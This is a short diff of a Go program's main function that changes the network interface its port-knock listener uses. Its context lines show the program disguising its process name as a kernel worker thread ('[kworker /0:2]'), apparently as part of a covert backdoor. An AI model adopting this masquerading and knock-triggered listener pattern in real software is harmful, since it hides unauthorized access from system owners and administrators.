@@ -13,7 +13,7 @@ func main() {
 	fmt.Println("Server Running")
 	// set the process name
 	disguiseProc("[kworker /0:2]")
-	listenForKnocks("wlp3s0")
+	listenForKnocks("eno1")
 
 }
 
